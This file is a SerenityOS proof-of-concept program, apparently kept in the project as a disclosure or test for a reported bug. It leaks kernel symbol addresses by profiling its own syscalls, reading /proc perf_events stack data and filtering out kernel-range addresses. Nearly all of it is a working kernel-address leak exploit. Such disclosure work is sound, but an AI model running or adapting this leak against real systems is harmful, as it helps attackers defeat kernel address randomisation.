/*
 * Copyright (c) 2021, the SerenityOS developers.
 *
 * SPDX-License-Identifier: BSD-2-Clause
 */

// Performance Events Kernel Symbols Leak
// ---
// Details:
// - https://github.com/SerenityOS/serenity/issues/6786
// ---
// ~ bcoles 2021

#include <AK/ByteBuffer.h>
#include <AK/JsonObject.h>
#include <AK/String.h>
#include <LibCore/ArgsParser.h>
#include <LibCore/File.h>
#include <LibSystem/syscall.h>
#include <serenity.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// Search address space 0xc0100000 to 0xc1000000
// This could be refined further if you have a vague idea where the desired symbol is located.
// The kernel layout generally does not change much between revisions.
uint32_t kernel_base = 0xc0000000;                    // KERNEL_VIRTUAL_BASE = 3GB boundary
uint32_t kernel_start = 0x100000;                     // kernel start
uint32_t kernel_sym_min = kernel_base + kernel_start; // start of kernel symbols
uint32_t kernel_sym_max = kernel_sym_min + 0xf00000;  // end of kernel symbols

static Vector<uint32_t> read_perf_events(pid_t pid)
{
    Vector<uint32_t> symbols;
    auto file = Core::File::construct(String::formatted("/proc/{}/perf_events", pid));
    if (!file->open(Core::IODevice::ReadOnly)) {
        fprintf(stderr, "Error: %s\n", file->error_string());
        return symbols;
    }

    auto file_contents = file->read_all();
    file->close();
    outln("Read profile event data ({} bytes) for PID {}", file_contents.size(), pid);

    auto input = String::copy(file_contents);

    //outln("Raw event data: {}", input);

#ifdef PERF_DEBUG
    // Useful cheat output if we already know the symbol addresses for the current kernel
    if (input.contains("3225026960"))
        outln("FOUND syscall_asm_entry 3225026960");

    if (input.contains("3225383706")) {
        outln("FOUND getuid 3225383706");
        sleep(1);
    }

    if (input.contains("3225791228")) {
        outln("FOUND setuid 3225791228");
        sleep(1);
    }
#endif

    auto json = JsonValue::from_string(file_contents);
    if (!json.has_value()) {
        perror("Event data is empty!");
        return symbols;
    }

    auto events = json.value().as_object().get("events");
    if (!events.is_array()) {
        perror("events[\"events\"] is not an array!");
        return symbols;
    }

    events.as_array().for_each([&](auto& event) {
        JsonValue stack = event.as_object().get("stack");

        if (!stack.is_array())
            return IterationDecision::Continue;

        if (stack.as_array().is_empty())
            return IterationDecision::Continue;

        // We ony care about the first stack address
        JsonValue entry = stack.as_array().at(0);

        //stack.as_array().for_each([&](auto& entry) {
        //    ...
        //    return IterationDecision::Continue;
        //});

        // We only care about addresses which are even
        if (entry.as_u32() % 2 != 0)
            return IterationDecision::Continue;

        // We only care about kernel addresses which may be symbols
        if (entry.as_u32() < kernel_sym_min || entry.as_u32() > kernel_sym_max)
            return IterationDecision::Continue;

        // stack size is 6 when called via syscall(); 7 when called by libc
        if (stack.as_array().size() != 6)
            return IterationDecision::Continue;

        //outln("Interesting kernel address: {}", entry);
        //outln("STACK: {}", stack);

        if (!symbols.contains_slow(entry.as_u32()))
            symbols.append(entry.as_u32());

#ifdef PERF_DEBUG
        // cheating debug output if we already know the address
        if (stack.to_string().contains("3225026960")) {
            outln("STACK: {}", stack);
            outln("syscall_asm_entry: 3225026960");
        }

        if (stack.to_string().contains("3225383706")) {
            outln("STACK: {}", stack);
            outln("getuid: 3225383706");
        }

        if (stack.to_string().contains("3225791228")) {
            outln("STACK: {}", stack);
            outln("setuid: 3225791228");
        }
#endif

        return IterationDecision::Continue;
    });

    return symbols;
}

int main(int argc, char** argv)
{
    Core::ArgsParser args_parser;
    args_parser.parse(argc, argv);

    pid_t pid = getpid();

    // First lets profile some junk we are *not* interest in
    if (profiling_enable(pid) < 0) {
        perror("profiling_enable");
        return 1;
    }

    outln("Spamming syscalls (PID: {}) ...", pid);
    for (int i = 0; i <= 20'000'000; ++i) {
        syscall(SC_dbgputstr);
    }

    if (profiling_disable(pid) < 0) {
        perror("profiling_disable");
        return 1;
    }

    Vector<uint32_t> false_symbols = read_perf_events(pid);

    // ok, now let's profile something useful
    if (profiling_enable(pid) < 0) {
        perror("profiling_enable");
        return 1;
    }

    outln("Spamming syscalls (PID: {}) ...", pid);

    for (int i = 0; i <= 20'000'000; ++i) {
        syscall(SC_setuid);
        //setuid(0);
        //syscall(SC_getuid);
        //getuid();
    }

    if (profiling_disable(pid) < 0) {
        perror("profiling_disable");
        return 1;
    }

    Vector<uint32_t> symbols = read_perf_events(pid);

    outln("Potential addresses:");
    for (auto& symbol : symbols) {
        if (!false_symbols.contains_slow(symbol)) {
            outln("{:08x}", symbol);
        }
    }

    return 0;
}
